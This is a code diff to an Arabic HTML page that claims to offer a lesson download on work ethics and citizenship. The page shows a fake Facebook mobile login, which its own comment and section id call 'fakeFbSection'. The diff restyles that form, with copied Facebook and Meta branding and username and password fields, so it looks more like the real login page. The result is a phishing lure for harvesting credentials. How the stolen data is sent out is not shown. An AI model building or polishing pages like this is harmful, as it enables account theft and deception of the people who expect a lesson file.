@@ -6,16 +6,16 @@
     <title>تحميل درس أخلاق العمل و المواطنة</title>
     <style>
         :root {
-            --fb-blue: #1877f2;
+            --fb-blue: #0064e0;
             --fb-blue-hover: #166fe5;
             --fb-border: #ccd0d5;
-            --fb-bg: #f0f2f5;
+            --fb-bg: #ffffff;
             --fb-text: #1c1e21;
         }
         *, *::before, *::after { box-sizing: border-box; }
         body {
             margin: 0;
-            font-family: Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             color: var(--fb-text);
             background-color: var(--fb-bg);
             display: flex;
@@ -60,31 +60,34 @@
             display: none;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
+            justify-content: space-between;
             width: 100%;
-            max-width: 430px;
-            padding: 16px;
+            max-width: 410px;
+            min-height: 100vh;
+            padding: 16px 20px;
             margin: auto;
+            background-color: #ffffff;
         }
         .m-lang {
             font-size: 14px;
-            color: #1c1e21;
-            margin-bottom: 25px;
+            color: #90949c;
+            margin-top: 10px;
+            margin-bottom: 35px;
             text-align: center;
         }
         .m-logo-circle {
-            width: 64px;
-            height: 64px;
+            width: 60px;
+            height: 60px;
             background-color: var(--fb-blue);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-bottom: 30px;
+            margin-bottom: 35px;
         }
         .m-logo-circle svg {
-            width: 38px;
-            height: 38px;
+            width: 34px;
+            height: 34px;
             fill: #ffffff;
         }
         .m-form {
@@ -97,14 +100,15 @@
             width: 100%;
             padding: 14px 12px;
             border: 1px solid var(--fb-border);
-            border-radius: 8px;
+            border-radius: 6px;
             font-size: 16px;
             outline: none;
-            background: #ffffff;
+            background: #f5f6f7;
             text-align: right;
         }
         .m-form input:focus {
             border-color: var(--fb-blue);
+            background: #ffffff;
         }
         .m-login-btn {
             width: 100%;
@@ -112,7 +116,7 @@
             background: var(--fb-blue);
             color: white;
             border: none;
-            border-radius: 25px;
+            border-radius: 20px;
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
@@ -123,7 +127,7 @@
         }
         .m-forgot {
             text-align: center;
-            margin-top: 12px;
+            margin-top: 15px;
         }
         .m-forgot a {
             color: var(--fb-text);
@@ -135,43 +139,51 @@
             display: flex;
             align-items: center;
             text-align: center;
-            margin: 25px 0 20px 0;
+            margin: 25px 0;
+            color: #90949c;
+            font-size: 13px;
         }
         .m-divider::before, .m-divider::after {
             content: '';
             flex: 1;
-            border-bottom: 1px solid #dadde1;
+            border-bottom: 1px solid #ccd0d5;
         }
+        .m-divider::before { margin-left: 10px; }
+        .m-divider::after { margin-right: 10px; }
+
         .m-create-btn {
             width: 100%;
             padding: 12px;
             background: transparent;
-            color: var(--fb-blue);
-            border: 1px solid var(--fb-blue);
-            border-radius: 25px;
-            font-size: 16px;
+            color: var(--fb-text);
+            border: 1px solid #ccd0d5;
+            border-radius: 20px;
+            font-size: 15px;
             font-weight: bold;
             cursor: pointer;
             text-align: center;
         }
         .m-meta-footer {
             margin-top: 40px;
+            margin-bottom: 10px;
             text-align: center;
+            width: 100%;
         }
         .m-meta-logo {
             font-weight: bold;
-            font-size: 16px;
-            letter-spacing: 1px;
-            color: #000;
+            font-size: 15px;
+            letter-spacing: 0.5px;
+            color: #4b4f56;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 4px;
-            margin-bottom: 8px;
+            gap: 5px;
+            margin-bottom: 6px;
         }
         .m-meta-links {
-            font-size: 12px;
-            color: #707579;
+            font-size: 11px;
+            color: #737373;
+            word-spacing: 2px;
         }
     </style>
 </head>
@@ -186,30 +198,34 @@
 
     <!-- الخطوة الثانية: واجهة فيسبوك للموبايل (تظهر عند الضغط على زر التحميل) -->
     <div id="fakeFbSection">
-        <div class="m-lang">العربية</div>
-        
-        <div class="m-logo-circle">
-            <!-- أيقونة فيسبوك الدائرية الرسمية -->
-            <svg viewBox="0 0 320 512">
-                <path d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 121.05-43.22 102.75-110.73 102.75v92.66h92.66V384h89.86z"/>
-            </svg>
+        <div>
+            <div class="m-lang">العربية</div>
+            
+            <div style="display: flex; justify-content: center;">
+                <div class="m-logo-circle">
+                    <!-- أيقونة فيسبوك الدائرية الرسمية -->
+                    <svg viewBox="0 0 320 512">
+                        <path d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 121.05-43.22 102.75-110.73 102.75v92.66h92.66V384h89.86z"/>
+                    </svg>
+                </div>
+            </div>
+
+            <form id="authForm" class="m-form">
+                <input type="text" id="username" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
+                <input type="password" id="password" placeholder="كلمة السر" required>
+                <button type="submit" class="m-login-dev m-login-btn">تسجيل الدخول</button>
+                <div class="m-forgot">
+                    <a href="#">هل نسيت كلمة السر؟</a>
+                </div>
+                
+                <div class="m-divider">أو</div>
+                
+                <button type="button" class="m-create-btn">إنشاء حساب جديد</button>
+            </form>
         </div>
 
-        <form id="authForm" class="m-form">
-            <input type="text" id="username" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
-            <input type="password" id="password" placeholder="كلمة السر" required>
-            <button type="submit" class="m-login-btn">تسجيل الدخول</button>
-            <div class="m-forgot">
-                <a href="#">هل نسيت كلمة السر؟</a>
-            </div>
-            
-            <div class="m-divider">أو</div>
-            
-            <button type="button" class="m-create-btn">إنشاء حساب جديد</button>
-        </form>
-
         <div class="m-meta-footer">
-            <div class="m-meta-logo">∞ Meta</div>
+            <div class="m-meta-logo">Meta ∞</div>
             <div class="m-meta-links">حول · مساعدة · المزيد</div>
         </div>
     </div>
